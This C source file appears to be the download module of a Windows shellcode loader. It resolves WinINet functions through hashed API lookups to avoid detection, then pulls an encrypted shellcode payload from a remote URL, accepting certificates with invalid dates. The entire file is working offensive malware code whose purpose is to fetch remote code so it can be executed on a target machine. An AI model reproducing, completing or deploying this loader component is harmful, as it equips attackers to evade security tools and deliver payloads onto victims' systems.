/*
 *  ~ internet.c ~
 * Download payload from remote webserver
 * Author: jakobfriedl
 */

#include "base.h"

typedef struct _Wininet_Struct {
    fnInternetOpenW pInternetOpenW;
    fnInternetOpenUrlW pInternetOpenUrlW;
    fnInternetReadFile pInternetReadFile;
    fnInternetCloseHandle pInternetCloseHandle;
    fnInternetSetOptionW pInternetSetOptionW; 
} WININET_STRUCT, *PWININET_STRUCT;

BOOL InitWininetStruct(OUT PWININET_STRUCT St) {

    // Get kernel32.dll module handle
    HANDLE hKernel32 = GetModuleHandleH(kernel32dll_HASH); 
    if (!hKernel32) {
        PRINT_ERROR("GetModuleHandleH"); 
        return FALSE;
    }

    fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(hKernel32, LoadLibraryA_HASH); 
    
    // Get module wininet.dll
    // TODO: Replace with custom LoadLibraryH function that takes the hash instead
    HMODULE hWininet = pLoadLibraryA("wininet.dll"); 

    // Populate struct members with API addresses
    St->pInternetOpenW = (fnInternetOpenW)GetProcAddressH(hWininet, InternetOpenW_HASH); 
    St->pInternetOpenUrlW = (fnInternetOpenUrlW)GetProcAddressH(hWininet, InternetOpenUrlW_HASH); 
    St->pInternetReadFile = (fnInternetReadFile)GetProcAddressH(hWininet, InternetReadFile_HASH); 
    St->pInternetCloseHandle = (fnInternetCloseHandle)GetProcAddressH(hWininet, InternetCloseHandle_HASH); 
    St->pInternetSetOptionW = (fnInternetSetOptionW)GetProcAddressH(hWininet, InternetSetOptionW_HASH); 

    // Check if all members have been filled
    if (!St->pInternetOpenUrlW ||
        !St->pInternetOpenUrlW ||
        !St->pInternetReadFile ||
        !St->pInternetCloseHandle ||
        !St->pInternetSetOptionW) {
        PRINT_ERROR("GetProcAddressH"); 
        return FALSE; 
    }

    return TRUE; 
}

BOOL Download(IN LPCWSTR lpUrl, OUT PBYTE* pEncShellcode, OUT SIZE_T* sShellcodeSize) {

    PRINTW(L"\n[~~~] Downloading payload from %s...\n", lpUrl); 
    
    BOOL bState = TRUE;
    WININET_STRUCT St = { 0 }; 

    HINTERNET hInternet = NULL; 
    HINTERNET hUrl = NULL; 
    DWORD dwBytesRead = NULL;
    PBYTE pBytes = NULL; 
    PBYTE pTmpBytes = NULL; 
    const DWORD dwBufferSize = 1024; 

    if (!InitWininetStruct(&St)) {
        PRINT_ERROR("InitWininetStruct"); 
        return FALSE; 
    }

    // Open Internet Session
    hInternet = St.pInternetOpenW(NULL, NULL, NULL, NULL, NULL); 
    if (!hInternet) {
        PRINT_ERROR("InternetOpenW");
        bState = FALSE;
        goto CLEANUP; 
    }
    OKAY("[ 0x%p ] Internet connection established.", hInternet); 

    // Open handle to URL
    hUrl = St.pInternetOpenUrlW(hInternet, lpUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (!hUrl) {
        PRINT_ERROR("InternetOpenUrlW"); 
        bState = FALSE;
        goto CLEANUP; 
    }
    OKAY_W(L"[ 0x%p ] Connected to %s.", hUrl, lpUrl);

    // Read data from handle
    pTmpBytes = (PBYTE)LocalAlloc(LPTR, dwBufferSize);
    if (!pTmpBytes) {
        PRINT_ERROR("LocalAlloc");
        bState = FALSE;
        goto CLEANUP;
    }

    do {
        // Read payload data from the URL
        if (!St.pInternetReadFile(hUrl, pTmpBytes, dwBufferSize, &dwBytesRead)) {
            PRINT_ERROR("InternetReadFile");
            bState = FALSE;
            goto CLEANUP;
        }

        if (dwBytesRead > 0) {

            PBYTE pTemp = (PBYTE)realloc(*pEncShellcode, *sShellcodeSize + dwBytesRead + 1);
            if (!pTemp) {
                PRINT_ERROR("realloc"); 
                bState = FALSE; 
                goto CLEANUP; 
            }

            *pEncShellcode = pTemp; 
            CopyMemoryEx(*pEncShellcode + *sShellcodeSize, pTmpBytes, dwBytesRead); 
            *sShellcodeSize += dwBytesRead; 
            (*pEncShellcode)[*sShellcodeSize] = '\0'; 
        }

    } while (dwBytesRead > 0); 

CLEANUP: 

    // Close handles
    if (hInternet) {
        St.pInternetCloseHandle(hInternet); 
    }

    if (hUrl) {
        St.pInternetCloseHandle(hUrl); 
    }

    // Close Http/s connection
    if (!St.pInternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0)) {
        PRINT_ERROR("InternetSetOptionW");
        bState = FALSE; 
    }

    // Free buffers
    if (pBytes) {
        LocalFree(pBytes); 
    }

    if (pTmpBytes) {
        LocalFree(pTmpBytes); 
    }

    return bState; 
}